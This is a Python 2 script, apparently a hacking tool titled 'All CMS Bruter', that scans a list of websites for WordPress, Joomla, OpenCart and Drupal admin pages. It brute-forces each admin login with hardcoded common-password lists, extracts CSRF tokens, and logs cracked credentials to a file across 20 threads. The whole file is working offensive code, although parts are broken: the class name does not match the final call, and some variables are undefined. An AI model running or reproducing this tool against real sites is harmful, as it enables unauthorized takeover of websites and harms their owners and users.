import cookielib
import os
import random
import re
import requests
import sys
import time
import urllib
import urllib2
from multiprocessing.dummy import *
from colorama import *
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
grey = '\033[90m'
white = '\033[00m'
init()
if not os.path.exists("Cms"):
    os.mkdir("Cms", 0755)
class ManiacBruter:
    def __init__(self):
            clear = "\x1b[0m"
            colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
            x = """

     _    _     _        ____ __  __ ____    ____  ____  _   _ _____ _____ ____  
    / \  | |   | |      / ___|  \/  / ___|  | __ )|  _ \| | | |_   _| ____|  _ \ 
   / _ \ | |   | |     | |   | |\/| \___ \  |  _ \| |_) | | | | | | |  _| | |_) |
  / ___ \| |___| |___  | |___| |  | |___) | | |_) |  _ <| |_| | | | | |___|  _ < 
 /_/   \_\_____|_____|  \____|_|  |_|____/  |____/|_| \_\\___/  |_| |_____|_| \_\
                                                                                 
 All CMS Bruter (Wordpress - Joomla - OpenCart - Drupal)    
                    Coded by LAKER       
                    
 [+] INSTA: @E9_z_
 [+] TELEGRAM :@LAKER305

+-------- Use it at your own risk --------+
    """
            for N, line in enumerate(x.split("\n")):
                sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                time.sleep(0.05)
            list = raw_input('List of Sites : ')
            url = open(list, 'r').readlines()
            ThreadPool = Pool(20)
            ThreadPool.map(self.cms, url)
    def cms(self, url):
        try:
            url = url.replace('\n', '').replace('\r', '')
            op = requests.get(url+'/admin',timeout=7)
            op2 = requests.get(url + '/administrator/index.php',timeout=7)
            op3 = requests.get(url + '/wp-login.php',timeout=7)
            op4 = requests.get(url + '/admin',timeout=7)
            if "dashboard" in op.text:
                print "[+] OPencarte", url + white + '\n'
                open("Cms/Opencarte.txt", "a").write(url + '\n')
                self.opencart(url)
            elif "Joomla" in op2.text:
                print "[+] Joomla", url + white + '\n'
                open("Cms/Joomla.txt", "a").write(url + '\n')
                self.joomla(url)
            elif "WordPress" in op3.text:
                print "[+] Wordpress", url + white + '\n'
                open("Cms/wordpress.txt", "a").write(url + '\n')
                self.wpbrute(url)
            elif "sites/default" in op4.text:
                print   "[+] Drupal", url + white + '\n'
                open("Cms/drupal.txt", "a").write(url + '\n')
                self.Drupal(url)
            else:
                print '[-] Cms Not Found -->' + url + '\n'
        except:
            print
    def joomla(self,url):
        try:
            Agent = {
                'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

            admins = ['admin', 'demo']
            passwords = ['admin', 'demo123', 'demo', 'secret', 'admin123', '123456', '123456789', '123', '1234', '12345',
                         '1234567', '12345678', '123456789', 'admin1234', 'admin123456', 'pass123', 'root', '321321',
                         '123123', '112233', '102030', 'password', 'pass', 'qwerty', 'abc123', '654321', 'pass1234',
                         'password123', 'Beast3x@8*#4@!']
            jo_lib = requests.session()
            for admin in admins:
                for pwdjox in passwords:
                    pwdjoxz = pwdjox.strip()
                    jo_lib1 = jo_lib.get(url + '/administrator/index.php',timeout=7)
                    token = re.findall('type="hidden" name="(.*?)" value="1"', jo_lib1.content)
                    jo_logs = {'username': admin,
                               'passwd': pwdjoxz,
                               token[0]: '1',
                               'lang': 'en-GB',
                               'option': 'com_login',
                               'task': 'login',
                               'return': 'aW5kZXgucGhw'}
                    req_jo = jo_lib.post(url + '/administrator/index.php', data=jo_logs, headers=Agent,timeout=7)
                    if 'New Article' in req_jo.content:
                        jo_check = jo_lib.get(url + '/administrator/index.php?option=com_plugins',timeout=7)
                        if 'New Article' in jo_check.content:
                            print yellow + '-----------------------------------------Joomla-----------------------------------------' + white + '\n'
                            print la5dhar + '[+] Cracked Success Joomla --> ' + url + '|' + admin + '|' + pwdjoxz + white + '\n'
                            print yellow + '------------------------------------------------------------------------------------------' + white + '\n'
                            open('Cracked.txt', 'a').write(
                                url + '/administrator/index.php ' + '|' + admin + '|' + pwdjoxz + ' [#]Joomla \n')
                        else:
                            print '[-] Failed Joomla -->' + url + '|' + admin + ';' + pwdjoxz + white + '\n'
                    else:
                        print '[-] Failed Joomla -->' + url + '|' + admin + ';' + pwdjoxz + white + '\n'
        except:
            pass
    def opencart(self,url):
        try:
            cr = open('Cracked.txt', 'a')
            passlist = ["123", "1", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123", "123", "test",
                        "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234",
                        "logitech",
                        "p@ssw0rd", "login", "test123", "root", "pass123", "password1", "qwerty", "111111", "gimboroot"]
            for passwordx in passlist:
                passwd = passwordx.strip()
                cookies = {
                    'OCSESSID': '41793cc49288925a72df1b7b5c',
                    'language': 'en-gb',
                    'currency': 'IDR',
                }

                data = {
                    'username': 'admin',
                    'password': passwd
                }
                r = requests.get(url + "/admin/index.php",timeout=7)
                if "https://" in r.url:
                    url = url.replace("http://", "https://")
                else:
                    pass
                s = requests.Session()
                r = s.post(url + '/admin/index.php', cookies=cookies, data=data,timeout=7)
                if 'common/logout' in r.text:
                    print yellow + '-----------------------------------------OpenCart-----------------------------------------' + white + '\n'
                    print blue + '[+] Cracked Success OpenCart--> ' + url + '|admin|' + passwd + white + '\n'
                    print yellow + '------------------------------------------------------------------------------------------' + white + '\n '
                    cr.write(url + '/admin |admin|' + passwd + ' [#]OpenCart\n')
                    break
                else:
                    print '[-] Failed  OpenCart --> ' + url + '|admin|' + passwd + white + '\n'
            return 0
        except:
            print 'Contact @YonixManiac'
    def wpbrute(self,url):
        try:
            user = "admin"
            passlist = ["test","1234567890","xmagico","uT3ygfF44Cdlp4TFyq", "zx321654xz","admin1234" ,"admin", "123456", "pass", "password", "admin123", "12345",
                        "admin@123", "123", "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890",
                        "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "1q2w3e4r", "xxx", "pass@123"]
            for password in passlist:
                password = password.strip()
                try:
                    cj = cookielib.CookieJar()
                    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
                    login_data = urllib.urlencode({'log': user, 'pwd': password})
                    opener.open(str(url) + '/wp-login.php', login_data)
                    resp = opener.open(str(url) + '/wp-admin')
                    final = resp.read()
                    if '<li id="wp-admin-bar-logout">' in final:
                        print yellow + '-----------------------------------------Wordpress-----------------------------------------' + white + '\n'
                        print green + "[+] Cracked Success Wp--> " + str(
                            url) + '/wp-login.php|' + user + '|' + password + white + '\n'
                        print yellow + '--------------------------------------------------------------------------------------------' + white + '\n'
                        with open('Cracked.txt', 'a') as myfile:
                            myfile.write(str(url) + '/wp-login.php' + ' |' + user + '|' + password + ' [#]Wordpress \n')
                        break
                    else:
                        print '[-] Failed  Wordpress --> ' + url + '|admin|' + password + white + '\n'
                except:
                    pass
        except:
            pass
    def Drupal(self,url):
        passlist = ["123", "uT3ygfF44Cdlp4TFyq", "admin", "123456", "pass", "password", "admin123", "12345", "admin@123",
                    "123", "test",
                    "123456789", "1234", "12345678", "123123", "demo", "blah", "hello", "1234567890", "zx321654xz",
                    "1234567", "adminadmin", "welcome", "666666", "access", "1q2w3e4r", "xmagico", "admin1234"]
        Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        for password in passlist:
            password = password.strip()
            try:
                lib = requests.session()
                Getcsrf = lib.get(url + '/?q=user',timeout=7)
                Token1 = re.findall('"form_build_id" value="(.*?)" />', Getcsrf.content)
                Token2 = re.findall('type="hidden" name="form_id" value="user(.*?)" />', Getcsrf.content)
                Token3 = re.findall('id="edit-submit" name="op" value="(.*?)" class="', Getcsrf.content)
                Token4 = re.findall('name="op" id="edit-submit" value="(.*?)" class="', Getcsrf.content)
                Tokenk = []
                Tokenk.append(Token3)
                Tokenk.append(Token4)
                for tok3 in Tokenk:
                    tok3 = tok3
                    for tok4 in tok3:
                        Tokens = tok4
                user = 'admin'
                bdaa0x = {'name': user,
                       'pass': password,
                       'form_build_id': Token1[0],
                       'form_id': 'user' + str(Token2[0]),
                       'op': Tokens
                       }
                req = lib.post(url + '/?q=user', data=bdaa0x, headers=Headers,timeout=7)
                if '"user/logout"' in req.content:
                    open('Cracked.txt', 'a').write(url + '/?q=user' + '|' + Users + '|' + passwd + '\n')
                    print yellow + '-----------------------------------------Drupal-----------------------------------------' + white + '\n'
                    print green + "[+] Cracked Success Drupal--> " + url + '/admin|' + user + '|' + password + white + '\n'
                    print yellow + '--------------------------------------------------------------------------------------------' + white + '\n'
                else:
                    print '[-] Failed  Drupal --> ' + url + '|admin|' + password + white + '\n'
            except:
                pass
CMSBruter()
